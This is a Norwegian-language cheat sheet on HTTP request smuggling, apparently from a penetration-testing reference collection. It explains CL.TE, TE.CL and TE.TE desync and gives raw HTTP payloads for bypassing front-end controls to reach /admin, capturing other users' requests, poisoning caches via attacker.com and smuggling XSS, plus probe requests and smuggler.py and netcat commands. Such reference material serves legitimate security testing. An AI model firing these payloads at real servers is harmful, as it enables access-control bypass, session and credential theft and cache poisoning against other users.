# 📦 Hurtigreferanse for HTTP request smuggling

<!-- language-home-navigation -->
[🏠 Norsk startside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

<p align="center">
  <a href="README.tr.md">🇹🇷 Türkçe Sürüm</a> • <a href="README.el.md">🇬🇷 Ελληνικά</a>
</p>

```
  ██╗  ██╗████████╗████████╗██████╗     ███████╗███╗   ███╗██╗   ██╗ ██████╗  ██████╗ ██╗     ██╗███╗   ██╗ ██████╗ 
  ██║  ██║╚══██╔══╝╚══██╔══╝██╔══██╗    ██╔════╝████╗ ████║██║   ██║██╔════╝ ██╔════╝ ██║     ██║████╗  ██║██╔════╝ 
  ███████║   ██║      ██║   ██████╔╝    ███████╗██╔████╔██║██║   ██║██║  ███╗██║  ███╗██║     ██║██╔██╗ ██║██║  ███╗
  ██╔══██║   ██║      ██║   ██╔═══╝     ╚════██║██║╚██╔╝██║██║   ██║██║   ██║██║   ██║██║     ██║██║╚██╗██║██║   ██║
  ██║  ██║   ██║      ██║   ██║         ███████║██║ ╚═╝ ██║╚██████╔╝╚██████╔╝╚██████╔╝███████╗██║██║ ╚████║╚██████╔╝
  ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝         ╚══════╝╚═╝     ╚═╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 
```

---

> **Begreper og presisering:** Request smuggling bygger på uenighet om hvor en HTTP-forespørsel slutter. CL og TE viser til Content-Length og Transfer-Encoding. De viste lengdene, chunk-størrelsene, blanklinjene og CRLF-forutsetningene er illustrative og miljøavhengige; ingen verdi er reparert. Markdown-kopiering garanterer ikke korrekte overførte byte. RFC 9112 beskriver streng meldingstolking og håndtering av CL/TE, se [spesifikasjonen](https://www.rfc-editor.org/rfc/rfc9112.html). Et tidsavbrudd eller en 404-respons alene bekrefter ikke smuggling, og en proxy/CDN i seg selv er ikke bevis på en sårbarhet. Eksemplene er bevart.


## 🎯 Hva er request smuggling?

**HTTP request smuggling** utnytter forskjeller i hvordan en front-end-proxy og en back-end-server tolker HTTP-forespørsler, slik at ekstra forespørsler kan bli tolket inn i forbindelsen.

### Konsekvenser
- 🔴 **Omgå sikkerhetskontroller** – omgåelse av WAF/ACL
- 🔴 **Forgift hurtigbufferen** – mellomlagre ondsinnede responser
- 🔴 **Stjel påloggingsopplysninger** – fang opp andre brukeres forespørsler
- 🔴 **XSS** – reflektert XSS via en smuglet forespørsel

---

## 🔍 Slik fungerer det

### Aktuelle headere
```http
Content-Length: 13
Transfer-Encoding: chunked
```

### Sårbarhetstyper
| Type | Front-end bruker | Back-end bruker |
|------|----------------|---------------|
| CL.TE | Content-Length | Transfer-Encoding |
| TE.CL | Transfer-Encoding | Content-Length |
| TE.TE | Begge tilslørt | Én header ignoreres |

---

## 💉 Angrepspayloads

### CL.TE (Content-Length → Transfer-Encoding)

**Front-end bruker Content-Length, back-end bruker Transfer-Encoding**

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

**Utnyttelse:**
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 30
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Foo: x
```

### TE.CL (Transfer-Encoding → Content-Length)

**Front-end bruker Transfer-Encoding, back-end bruker Content-Length**

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

### TE.TE (tilslørt Transfer-Encoding)

```http
# Tilslør TE-headeren
Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: identity

Transfer-Encoding
 : chunked

Transfer-Encoding: xchunked

Transfer-Encoding: chunked#
```

---

## 🔥 Eksempler på utnyttelse

### Omgå sikkerheten i front-end
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 50
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable.com
Foo: x
```

### Fang opp andre brukeres forespørsler
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 100
Transfer-Encoding: chunked

0

POST /log HTTP/1.1
Host: vulnerable.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 300

data=
```
*Neste brukers forespørsel blir lagt til etter `data=`*

### Forgiftning av hurtigbuffer via smuggling
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 130
Transfer-Encoding: chunked

0

GET /static/script.js HTTP/1.1
Host: vulnerable.com
X-Ignore: X
GET /malicious HTTP/1.1
Host: attacker.com
Foo: x
```

### XSS via smuggling
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 150
Transfer-Encoding: chunked

0

GET /page?param=<script>alert(1)</script> HTTP/1.1
Host: vulnerable.com
Foo: x
```

---

## 🔍 Identifikasjon

### Tidsbasert identifikasjon
```http
# CL.TE-test
POST / HTTP/1.1
Host: vulnerable.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X

# Hvis back-end bruker TE, venter den på en "0"-chunk
# Tidsavbrudd = mulig sårbarhet
```

### Forskjell i respons
```http
# Send en smuglet forespørsel som gir 404
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Foo: bar

# Hvis neste respons er 404 = sårbar ifølge originalen
```

---

## 🛠️ Verktøy

### Burp Suite-utvidelse
```
1. Installer utvidelsen "HTTP Request Smuggler"
2. Høyreklikk på forespørselen → Extensions → Launch Smuggle Probe
3. Undersøk resultatene for smuggling-sårbarheter
```

### smuggler.py
```bash
git clone https://github.com/defparam/smuggler.git
cd smuggler
python3 smuggler.py -u https://target.com
```

### Manuell testing med curl
```bash
# Merk: curl normaliserer headere; rå TCP kan være nødvendig
printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX' | nc target.com 80
```

---

## 📊 Hurtigreferanse

### Sjekkliste for identifikasjon
```markdown
- [ ] Se etter proxy/lastbalanserer (flere servere)
- [ ] Test tidsutslag for CL.TE
- [ ] Test tidsutslag for TE.CL
- [ ] Prøv tilsløring av TE-headeren
- [ ] Kontroller med forskjeller i respons
```

### Vanlige indikatorer
```
- Lastbalanserere (AWS ALB, HAProxy)
- Omvendte proxyer (nginx, Apache)
- CDN-er (Cloudflare, Akamai)
- Nedgradering fra HTTP/2 til HTTP/1.1
```

---

## ⚠️ Viktige merknader

```
1. Testing kan forstyrre andre brukere
2. Bruk isolerte testmiljøer når det er mulig
3. Legg til unike identifikatorer for å kjenne igjen forespørslene dine
4. Rapporter ansvarlig med en demonstrasjon (PoC)
```

---

## 📚 Ressurser

- [PortSwigger HTTP Request Smuggling](https://portswigger.net/web-security/request-smuggling)
- [HTTP Desync Attacks (Albinowax)](https://portswigger.net/research/http-desync-attacks)
- [Smuggler Tool](https://github.com/defparam/smuggler)

---

<p align="center">
  <b>📦 Undersøk request smuggling!</b><br>
  <i>Bare til autorisert testing!</i>
</p>
